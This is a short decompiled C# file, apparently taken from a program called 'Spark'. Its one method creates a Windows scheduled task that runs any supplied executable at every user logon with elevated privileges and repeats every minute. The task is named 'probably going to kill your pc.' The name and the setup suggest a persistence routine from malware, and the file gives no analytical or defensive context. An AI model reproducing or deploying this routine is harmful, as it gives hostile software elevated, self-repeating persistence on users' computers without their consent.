using System;
using Microsoft.Win32.TaskScheduler;

namespace Spark
{
	// Token: 0x0200000D RID: 13
	internal class TaskScheduling
	{
		// Token: 0x0600003E RID: 62 RVA: 0x00002F5C File Offset: 0x0000115C
		public static void Schedule(string toSchedule)
		{
			TaskService taskService = new TaskService();
			TaskDefinition taskDefinition = taskService.NewTask();
			taskDefinition.Principal.RunLevel = 1;
			LogonTrigger logonTrigger = new LogonTrigger();
			logonTrigger.Repetition.Interval = TimeSpan.FromMinutes(1.0);
			taskDefinition.Triggers.Add<LogonTrigger>(logonTrigger);
			taskDefinition.Actions.Add<ExecAction>(new ExecAction(toSchedule, null, null));
			taskService.RootFolder.RegisterTaskDefinition("probably going to kill your pc.", taskDefinition);
		}
	}
}
